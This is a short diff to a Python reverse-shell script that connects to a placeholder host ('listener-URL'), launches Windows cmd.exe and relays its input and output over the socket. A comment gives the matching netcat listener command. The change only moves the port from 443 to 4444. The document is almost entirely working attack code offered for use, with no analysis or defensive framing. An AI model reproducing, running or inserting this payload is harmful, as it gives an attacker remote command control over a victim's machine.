@@ -1,6 +1,6 @@
 import os,socket,subprocess,threading;
 
-# On listener: nc -lvp 443
+# On listener: nc -lvp 4444
 
 def s2p(s, p):
     while True:
@@ -14,7 +14,7 @@ def p2s(s, p):
         s.send(p.stdout.read(1))
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("listener-URL", 443))
+s.connect(("listener-URL", 4444))
 
 p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
